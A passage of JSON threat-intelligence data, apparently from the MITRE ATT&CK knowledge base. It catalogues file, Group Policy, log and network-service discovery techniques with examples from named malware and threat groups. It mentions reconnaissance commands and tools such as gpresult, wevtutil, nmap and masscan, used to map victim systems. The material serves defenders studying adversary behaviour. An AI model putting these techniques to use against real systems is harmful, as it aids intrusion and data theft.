"menuPass", "description": "menuPass has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos."}, {"id": "S0443", "name": "MESSAGETAP", "description": "MESSAGETAP checks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can recursively enumerate files in an operator-provided directory."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has searched the Program Files directories for specific folders and has searched for strings related to its mutexes."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia can perform a recursive directory listing for all volume drives available on the victim's machine and can also fetch specific files by their paths."}, {"id": "S0051", "name": "MiniDuke", "description": "MiniDuke can enumerate local drives."}, {"id": "S0083", "name": "Misdat", "description": "Misdat is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu searches for various filesystem paths to determine what banking applications are installed on the victim\u2019s machine."}, {"id": "S0079", "name": "MobileOrder", "description": "MobileOrder has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind has a command to return a directory listing for a specified directory."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords \"Kasper,\" \"Panda,\" or \"ESET.\""}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper generates a list of all files and paths on the fixed drives of an infected system, enumerating all files on the system except specific folders defined in a hardcoded list."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files."}, {"id": "S0272", "name": "NDiskMonitor", "description": "NDiskMonitor can obtain a list of all files and directories as well as logical drives."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can list files and directories on a compromised host."}, {"id": "S0034", "name": "NETEAGLE", "description": "NETEAGLE allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has the ability to search for files on the compromised host."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and browse the victim file system."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can use a file monitor to identify .lnk, .doc, .docx, .xls, .xslx, and .pdf files."}, {"id": "S1100", "name": "Ninja", "description": "Ninja has the ability to enumerate directory content."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can browse file systems using a file manager module."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya searches for files ending with dozens of different file extensions prior to encryption."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT has the ability to recursively enumerate files on an infected endpoint."}, {"id": "S0346", "name": "OceanSalt", "description": "OceanSalt can extract drive information from the endpoint and search files on the system."}, {"id": "S0340", "name": "Octopus", "description": "Octopus can collect information on the Windows directory and searches for compressed RAR files on the host."}, {"id": "S0439", "name": "Okrum", "description": "Okrum has used DriveLetterView to enumerate drive information."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used dir c:\\\\ to search for files."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group conducted word searches within documents on a compromised host in search of security and financial matters."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors used a malicious DLL to search for files with specific keywords."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors gathered a recursive directory listing to find files and directories of interest."}, {"id": "S0229", "name": "Orz", "description": "Orz can gather victim drive information."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer has used the command appDir=\"$(dirname $(dirname \"$currentDir\"))\" and $(dirname \"$(pwd -P)\") to construct installation paths."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel can search for specific file extensions, including zipped files."}, {"id": "S0072", "name": "OwaAuth", "description": "OwaAuth has a command to list its directory and logical drives."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell has the ability to list files and file characteristics including extension, size, ownership, and permissions."}, {"id": "S1109", "name": "PACEMAKER", "description": "PACEMAKER can parse /proc/\"process_name\"/cmdline to look for the string dswsd within the command line."}, {"id": "S0208", "name": "Pasam", "description": "Pasam creates a backdoor through which remote attackers can retrieve lists of files."}, {"id": "G0040", "name": "Patchwork", "description": "A Patchwork payload has searched all fixed drives on the victim for files matching a specified list of extensions."}, {"id": "S1102", "name": "Pcexter", "description": "Pcexter has the ability to search for files in specified directories."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can use the command code do_vslist to send file names, size, and status to C2."}, {"id": "S0643", "name": "Peppy", "description": "Peppy can identify specific files for exfiltration."}, {"id": "S0048", "name": "PinchDuke", "description": "PinchDuke searches for files created within a certain timeframe and whose file extension matches a predefined list."}, {"id": "S1031", "name": "PingPull", "description": "PingPull can enumerate storage volumes and folder contents of a compromised host."}, {"id": "S0124", "name": "Pisloader", "description": "Pisloader has commands to list drives on the victim machine and to list file information for a given directory."}, {"id": "G1040", "name": "Play", "description": "Play has used the Grixba information stealer to list security files and processes."}, {"id": "S1162", "name": "Playcrypt", "description": "Playcrypt can avoid encrypting files with a .PLAY, .exe, .msi, .dll, .lnk, or .sys file extension."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has the ability to list drives and files on the compromised host."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has a module to enumerate drives and find files recursively."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has the ability to list files upon receiving the ls command from C2."}, {"id": "S0216", "name": "POORAIM", "description": "POORAIM can conduct file browsing."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can enumerate files on the local file system and includes a module for enumerating recently accessed files."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may enumerate user directories on a victim."}, {"id": "S1058", "name": "Prestige", "description": "Prestige can traverse the file system to discover files to encrypt by identifying specific extensions defined in a hardcoded list."}, {"id": "S0113", "name": "Prikormka", "description": "A module in Prikormka collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc lists files in directories."}, {"id": "S0078", "name": "Psylo", "description": "Psylo has commands to enumerate all storage devices and to find all files that start with a particular string."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon identifies files matching certain file extension and copies them to subdirectories it created."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can walk through directories and recursively search for strings in files."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can identify whether it has been run previously on a host by checking for a specified folder."}, {"id": "S0686", "name": "QuietSieve", "description": "QuietSieve can search files on the target host by extension, including doc, docx, xls, rtf, odt, txt, jpg, pdf, rar, zip, and 7z."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer identifies target files and directories for collection based on a configuration file."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use a file exfiltration tool to collect recently changed files with specific extensions."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can collect directory and file lists."}, {"id": "S0055", "name": "RARSTONE", "description": "RARSTONE obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will check to see if the initial executing script is located on the user's Desktop as an anti-analysis check."}, {"id": "S1040", "name": "Rclone", "description": "Rclone can list files and directories with the ls, lsd, and lsl commands."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has searched for and collected files on local and network drives."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves can enumerate and search for files and directories."}, {"id": "S0332", "name": "Remcos", "description": "Remcos can search for files on the infected machine."}, {"id": "S0375", "name": "Remexi", "description": "Remexi searches for files on the system. "}, {"id": "S0592", "name": "RemoteUtilities", "description": "RemoteUtilities can enumerate files and directories on a target machine."}, {"id": "S0125", "name": "Remsec", "description": "Remsec is capable of listing contents of folders on the victim. Remsec also searches for custom network encryption software on victims."}, {"id": "S0496", "name": "REvil", "description": "REvil has the ability to identify specific files and directories that are not to be encrypted."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun can enumerate information about files from the infected system, including file size, attributes, creation time, last access time, and write time. Rising Sun can enumerate the compilation timestamp of Windows executable files."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP can enumerate files on infected devices and avoid encrypting files with .exe, .dll,    .sys, .lnk, or . lck extensions."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT has the ability to gather a list of files and directories on the infected system."}, {"id": "S0090", "name": "Rover", "description": "Rover automatically searches for files on local drives based on a predefined list of file extensions."}, {"id": "S1073", "name": "Royal", "description": "Royal can identify specific files and directories to exclude from the encryption process."}, {"id": "S0148", "name": "RTM", "description": "RTM can check for specific files and directories associated with virtualization and malware analysis."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has enumerated files and folders on all mounted drives."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot can search a compromised host for specific files."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can use a specific module for file enumeration."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has enumerated files on a compromised host."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider Spider enumerates a target organization for files and directories of interest, including source code."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to get directory listings or drive information on a compromised host."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt has the capability to identify the drive type on a victim."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco can identify recently opened files by using an LNK format parser to extract the original file path from LNK files found in either %USERPROFILE%\\Recent (Windows XP) or %APPDATA%\\Microsoft\\Windows\\Recent (newer Windows versions) ."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat can list directories."}, {"id": "S0063", "name": "SHOTPUT", "description": "SHOTPUT has a command to obtain a directory listing."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist has the ability to search for specific files."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used malware to collect information on files and directories."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY has several modules, such as ls.py, pwd.py, and recentFiles.py, to enumerate directories and files."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape searches for the Kubernetes config file and other related files using a regular expression."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has checked for the existence of specific files including /usr/sbin/setenforce and  /etc/selinux/config. It also has the ability to monitor the cryptocurrency miner file and process. "}, {"id": "S0633", "name": "Sliver", "description": "Sliver can enumerate files on a target system."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA can enumerate files and directories."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader recursively searches through directories for files."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 obtained information about the configured Exchange virtual directory using Get-WebServicesVirtualDirectory."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can execute enum to enumerate files in storage on a compromised system."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang has the ability to list directories."}, {"id": "S0157", "name": "SOUNDBITE", "description": "SOUNDBITE is capable of enumerating and manipulating files and directories."}, {"id": "G0054", "name": "Sowbug", "description": "Sowbug identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim."}, {"id": "S0035", "name": "SPACESHIP", "description": "SPACESHIP identifies files and directories for collection by searching for specific file extensions or file modification time."}, {"id": "S1140", "name": "Spica", "description": "Spica can list filesystem contents on targeted systems."}, {"id": "S0142", "name": "StreamEx", "description": "StreamEx has the ability to enumerate drive types."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can enumerate files on a compromised host."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can parse the hard drive on a compromised host to identify specific file extensions."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet uses a driver to scan for specific filesystem driver objects."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP can search for and collect data from specific Chrome, Opera, Microsoft Edge, and Firefox files, including any folders that have the string Profile in its name."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST had commands to enumerate files and directories."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT enumerated the Orion software Visual Studio solution directory path."}, {"id": "S0242", "name": "SynAck", "description": "SynAck checks its directory location in an attempt to avoid launching in a sandbox."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can search files on a compromised host."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can search for specific files."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can use DirectoryList to enumerate files in a specified directory."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to index files from drives, user profiles, and removable drives."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used a script that checks /proc/*/environ for environment variables related to AWS."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle can obtain file and directory information."}, {"id": "S0131", "name": "TINYTYPHON", "description": "TINYTYPHON searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has run scripts to enumerate recently modified documents having either a .pdf, .doc, .docx, .xls or .xlsx extension."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can enumerate files and directories on a compromised host."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has monitored files' modified time."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has the ability to discover drive information on the infected host."}, {"id": "S0647", "name": "Turian", "description": "Turian can search for specific files and list directories."}, {"id": "G0010", "name": "Turla", "description": "Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent. Turla RPC backdoors have also searched for files matching the lPH*.dll pattern."}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME can search directories for files on the victim\u2019s machine."}, {"id": "S0275", "name": "UPPERCUT", "description": "UPPERCUT has the capability to gather the victim's current directory."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can search for specific files on a compromised system."}, {"id": "S0452", "name": "USBferry", "description": "USBferry can detect the victim's file or folder list."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer searches victim drives for files matching certain extensions (\".skr\",\".pkr\" or \".key\") or names."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer can list directories on a victim."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has enumerated directories containing vulnerability testing and cyber related content and facilities data such as construction drawings."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry searches for variety of user files by file extension before encrypting them using RSA and AES, including Office, PDF, image, audio, video, source code, archive/compression format, and key and certificate files."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can enumerate directories on a compromise host."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker can enumerate files and directories just prior to encryption."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can locate files based on hardcoded file extensions."}, {"id": "G0124", "name": "Windigo", "description": "Windigo has used a script to check for the presence of files created by OpenSSH backdoors."}, {"id": "S0466", "name": "WindTail", "description": "WindTail has the ability to enumerate the users home directory and the path to its own application bundle."}, {"id": "S0219", "name": "WINERACK", "description": "WINERACK can enumerate files and directories."}, {"id": "S0059", "name": "WinMM", "description": "WinMM sets a WH_CBT Windows hook to search for and capture files on the victim."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can check for the presence of specific files prior to moving to the next phase of execution."}, {"id": "G0044", "name": "Winnti Group", "description": "Winnti Group has used a program named ff.exe to search for specific documents on compromised hosts."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern delivered malicious JavaScript payloads capable of listing folders and emails in exploited email servers."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can list all files and their associated attributes, including filename, type, owner, creation time, last access time, last write time, size, and permissions."}, {"id": "S0161", "name": "XAgentOSX", "description": "XAgentOSX contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory. XAgentOSX contains the showBackupIosFolder function to check for IOS device backups by running ls -la ~/Library/Application\\ Support/MobileSync/Backup/."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET has used mdfind to enumerate a list of apps known to grant screen sharing permissions."}, {"id": "S0248", "name": "yty", "description": "yty gathers information on victim\u2019s drives and has a plugin for document listing."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy searches for files that are 60mb and less and contain the following extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, and .rar. Zebrocy also runs the echo %APPDATA% command to list the contents of the directory. Zebrocy can obtain the current execution path as well as perform drive enumeration."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda searches for specific directories on the victim\u2019s machine."}, {"id": "S1114", "name": "ZIPLINE", "description": "ZIPLINE can find and append specific files on Ivanti Connect Secure VPNs based upon received commands."}, {"id": "S0086", "name": "ZLib", "description": "ZLib has the ability to enumerate files and drives."}, {"id": "S0672", "name": "Zox", "description": "Zox can enumerate files on a compromised host."}, {"id": "S0350", "name": "zwShell", "description": "zwShell can browse the file system."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has a command to open a file manager and explorer on the system."}], "sub_techniques": []}, {"name": "Group Policy Discovery", "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path \\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.", "detailed_description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path \\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.\nAdversaries may use commands such as gpresult or various publicly available PowerShell functions, such as Get-DomainGPO and Get-DomainGPOLocalGroup, to gather information on Group Policy settings. Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. Domain or Tenant Policy Modification) for their benefit.", "id": "T1615", "examples": [{"id": "S0521", "name": "BloodHound", "description": "BloodHound has the ability to collect local admin information via GPO."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can identify victim environment Group Policy information."}, {"id": "S0082", "name": "Emissary", "description": "Emissary has the capability to execute gpresult."}, {"id": "S0363", "name": "Empire", "description": "Empire includes various modules for enumerating Group Policy."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can capture information on group policy settings"}, {"id": "G0010", "name": "Turla", "description": "Turla surveys a system upon check-in to discover Group Policy details using the gpresult command."}], "sub_techniques": []}, {"name": "Log Enumeration", "description": "Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records (Account Discovery), security or vulnerable software (Software Discovery), or hosts within a compromised network (Remote System Discovery).", "detailed_description": "Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records (Account Discovery), security or vulnerable software (Software Discovery), or hosts within a compromised network (Remote System Discovery).\nHost binaries may be leveraged to collect system logs. Examples include using wevtutil.exe or PowerShell on Windows to access and/or export security event information. In cloud environments, adversaries may leverage utilities such as the Azure VM Agent\u2019s CollectGuestLogs.exe to collect security logs from cloud hosted infrastructure.\nAdversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.\nIn addition to gaining a better understanding of the environment, adversaries may also monitor logs in real time to track incident response procedures. This may allow them to adjust their techniques in order to maintain persistence or evade defenses.", "id": "T1654", "examples": [{"id": "G1023", "name": "APT5", "description": "APT5 has used the BLOODMINE utility to parse and extract information from Pulse Secure Connect logs."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda enumerated logs related to authentication in Linux environments prior to deleting selective entries for defense evasion purposes."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can identify infected system log information."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has enumerated SECURITY and SYSTEM log files during intrusions."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can collect CloudTrail event histories and CloudWatch logs."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used wevtutil.exe and the PowerShell command Get-EventLog security to enumerate Windows logs to search for successful logons."}], "sub_techniques": []}, {"name": "Network Service Discovery", "description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.", "detailed_description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as dns-sd -B _ssh._tcp .) to find other systems broadcasting the ssh service.", "id": "T1046", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius used the open-source port scanner WinEggDrop to perform detailed scans of hosts of interest in victim networks."}, {"id": "G0050", "name": "APT32", "description": "APT32 performed network scanning on the network to search for open ports, services, OS finger-printing, and other vulnerabilities."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used CrackMapExec and a custom port scanner known as BLUETORCH for network scanning."}, {"id": "G0096", "name": "APT41", "description": "APT41 used a malware variant called WIDETONE to conduct port scans on specified subnets."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea can use a network scanning module to identify ICS-related ports."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has used SMBTouch, a vulnerability scanner, to determine whether a target is vulnerable to EternalBlue malware."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can check for open ports on a computer by establishing a TCP connection."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has conducted port scans on a host."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has used the SNScan tool to find other potential targets on victim networks."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can conduct port scanning against targeted systems."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors used the SoftPerfect Network Scanner for network scanning."}, {"id": "C0027", "name": "C0027", "description": "During C0027, used RustScan to scan for open ports on targeted ESXi appliances."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell has a module to use a port scanner on a system."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used the get -b  -e  -p command for network scanning as well as a custom Python tool  packed into a Windows executable named Get.exe to scan IP ranges for HTTP."}, {"id": "S0020", "name": "China Chopper", "description": "China Chopper's server component can spider authentication portals."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can perform port scans from an infected host."}, {"id": "S0608", "name": "Conficker", "description": "Conficker scans for other machines to infect."}, {"id": "C0004", "name": "CostaRicto", "description": "During CostaRicto, the threat actors employed nmap and pscan to scan target environments."}, {"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya performed port scanning to obtain the list of active services."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used tools such as NMAP for remote system discovery and enumeration in victim environments."}, {"id": "S0363", "name": "Empire", "description": "Empire can perform port scans from an infected host."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has utilized nmap for reconnaissance efforts. FIN13 has also scanned for internal MS-SQL servers in a compromised network."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used tools including NMAP to conduct broad scanning to identify open ports."}, {"id": "S1144", "name": "FRP", "description": "As part of load balancing FRP can set healthCheck.type = \"tcp\" or healthCheck.type = \"http\" to check service status on specific hosts with TCPing or an HTTP request."}, {"id": "S0061", "name": "HDoor", "description": "HDoor scans to identify open ports on the victim."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard has the ability to scan ports on a compromised network."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has used masscan to look for kubelets in the internal Kubernetes network."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors executed the Advanced Port Scanner tool on compromised systems."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used NETSCAN.EXE for internal reconnaissance."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer uses a custom port scanner to map out a network."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can scan the network for open ports and vulnerable instances of RDP and SMB protocols."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can scan for open TCP ports on the target network."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer scanned network services to search for vulnerabilities in the victim system."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can scan for open ports including TCP ports 135 and 1433."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used KPortScan 3.0 to perform SMB, RDP, and LDAP scanning."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used tcping.exe, similar to Ping, to probe port status on systems of interest."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules for performing HTTP and server service scans."}, {"id": "S0233", "name": "MURKYTOP", "description": "MURKYTOP has the capability to scan for open ports on hosts in a connected network."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used the LadonGo scanner to scan target networks."}, {"id": "S0590", "name": "NBTscan", "description": "NBTscan can be used to scan IP networks."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors scanned for open ports and used nbtscan to find NETBIOS nameservers."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell can scan networks for open ports and listening services."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can initiate a port scan against a given IP address."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can perform port scans from an infected host."}, {"id": "S0192", "name": "Pupy", "description": "Pupy has a built-in module for port scanning."}, {"id": "S0583", "name": "Pysa", "description": "Pysa can perform network reconnaissance using the Advanced Port Scanner tool."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can scan for systems that are vulnerable to the EternalBlue exploit."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used netstat to check if port 4119 is open."}, {"id": "S0125", "name": "Remsec", "description": "Remsec has a plugin that can perform ARP scanning as well as port scanning."}, {"id": "G0106", "name": "Rocke", "description": "Rocke conducted scanning for exposed TCP port 7001 as well as SSH and Redis servers."}, {"id": "S1073", "name": "Royal", "description": "Royal can scan the network interfaces of targeted systems."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can scan for open ports on a compromised machine."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp checks for availability of specific ports on servers."}, {"id": "G0039", "name": "Suckfly", "description": "Suckfly the victim's internal network for hosts with ports 8080, 5900, and 40 open."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used masscan to search for open Docker API ports and Kubernetes clusters. TeamTNT has also used malware that utilizes zmap and zgrab to search for vulnerable services in cloud environments."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors use the Hunter tool to conduct network service discovery for vulnerable systems."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper used pr and an openly available tool to scan for open ports on target systems."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for network service discovery."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can perform port scanning of TCP and UDP ports."}, {"id": "S0117", "name": "XTunnel", "description": "XTunnel is capable of probing the network for open ports."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can launch port scans."}], "sub_techniques": []}, {"name": "Network Share Discovery", "description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.", "detailed_description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file 